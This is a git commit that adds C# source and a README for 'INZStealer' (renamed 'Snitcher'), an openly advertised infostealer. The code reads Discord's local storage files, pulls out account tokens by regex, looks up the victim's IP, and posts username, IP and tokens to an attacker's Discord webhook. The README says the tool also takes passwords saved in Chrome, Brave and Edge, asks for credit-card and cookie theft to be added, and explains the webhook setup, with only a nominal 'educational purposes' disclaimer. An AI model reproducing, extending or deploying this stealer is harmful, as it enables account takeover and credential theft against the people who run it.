c63be3eae3f0b9707ec0060923991d6a675862a5
xeno <xeno@LAPTOP>
2023-06-12 18:08:56 +0300

    Init

---
+++ INZStealer/DiscordG.cs
@@ -0,0 +1,94 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Collections.Specialized;
+using System.Net;
+using System.IO;
+using System.Text.RegularExpressions;
+using System.Linq;
+using System.Text;
+using System.Security.Principal;
+using static System.Net.WebRequestMethods;
+
+
+namespace DiscordG
+{
+    class Program
+    {
+        public static string webhook = ConsoleApp1.Program.Webhook_link; // Your webhook goes here
+
+
+        public static List<string> GetThem()
+        {
+            List<string> discordtokens = new List<string>();
+            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
+            if (rootfolder.Exists)
+            {
+                foreach (var file in rootfolder.GetFiles("*.ldb"))
+                {
+                    string readedfile = file.OpenText().ReadToEnd();
+
+                    foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                        discordtokens.Add(match.Value + "\n");
+
+                    foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
+                        discordtokens.Add(match.Value + "\n");
+                }
+
+
+                discordtokens = discordtokens.ToList();
+
+                Console.WriteLine(discordtokens);
+
+                return discordtokens;
+            }
+            else return null;
+        }
+        
+        public static string GetIP()
+        {
+            String address = "";
+            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
+            using (WebResponse response = request.GetResponse())
+            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
+            {
+                address = stream.ReadToEnd();
+            }
+
+            int first = address.IndexOf("Address: ") + 9;
+            int last = address.LastIndexOf("</body>");
+            address = address.Substring(first, last - first);
+            return address;
+        }
+
+        public static void SendMeResults(List<string> tokens)
+        {
+            string jsonPayload = "{\"content\": \"Report from Discord Grabber\\n\\nUsername: " + Environment.UserName + "\\nIP: " + GetIP() + "\\nTokens:\\n\\n" + string.Join("\\n", tokens) + "\\n\\n\"}";
+
+
+            try
+            {
+                using (WebClient client = new WebClient())
+                {
+                    client.Headers.Add("Content-Type", "application/json");
+                    string payload = jsonPayload;
+                    client.UploadData(webhook, "POST", Encoding.UTF8.GetBytes(payload));
+                }
+                Console.WriteLine("Webhook sent successfully.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error sending webhook: {ex.Message}");
+            }
+            
+           
+        }
+    }
+    class Http
+    {
+        public static byte[] Post(string uri, NameValueCollection pairs)
+        {
+            using (WebClient webClient = new WebClient())
+                return webClient.UploadValues(uri, pairs);
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,72 @@
+-----
+
+<p align="center">
+<img src="https://i.imgur.com/SBHpE9N.png", width="500", height="500">
+</p>
+
+-----
+
+
+### <p align="center">💥 Snitcher 💥</p>
+<p align="center">( previously known as InzStealer )</p>
+
+
+<br><br>
+<p align="center">
+<strong>
+This program is a tool made by <a href="https://github.com/InstinctEx">Instinct</a> (me) 
+<br>that exploits the security vulnerabilities of some chromium based web browsers and Discord.
+<br>It collects and sends the usernames and passwords stored in that browsers
+<br>of the users who run the program to a webhook on Discord.
+<br>It also steals the user's Discord tokens, which can be used to access their accounts and personal information.
+### <p align="center">⭐ Features ⭐</p>
+
+<br><br>
+<strong>+ Chrome Support</strong>
+<br>
+<strong>+ Brave Browser support </strong>
+<br>
+<strong>+ Microsoft Edge support</strong>
+<br>
+<strong>+ Discord Token support</strong>
+<br>
+<strong>+ Sends all results remotely using a Discord Webhook</strong>
+<br>
+
+<p align="right">
+<img src="https://i.imgur.com/SBHpE9N.png" width="250", height="250">
+</p>
+
+<br>
+<strong>- Fast execution ( 4-5 seconds )</strong>
+<br>
+<strong>- Browsers must be closed ( planning on fixing )</strong>
+<br><br>
+  
+-----
+
+### <p align="center">💡 Ideas 💡</p>
+
+<p align="center"><strong><i>Feel free to make a pull request on this repository to submit any idea!</i></strong</p>
+
+<br><br>
+* Add Credit Card, Cookies and more browsers Support!
+<br><br>
+
+-----
+### <p align="center">📌 Disclaimer 📌</p>
+
+<br><br>
+* ***Please use this program only for educational purposes.***
+* ***It is not meant to be used in any malicious way, and I decline any responsibility for what you do with it.***
+<br><br>
+
+-----
+  ### <p align="center">📌 How To Use 📌</p>
+
+<br><br>
+* Clone the repo
+* Edit [this](https://github.com/InstinctEx/INZStealer/blob/0af614f41534abaf33f0ea8a28e0eb61e81372f8/INZStealer/Program.cs#L24) to your discord webhook
+<br><br>
+
+-----
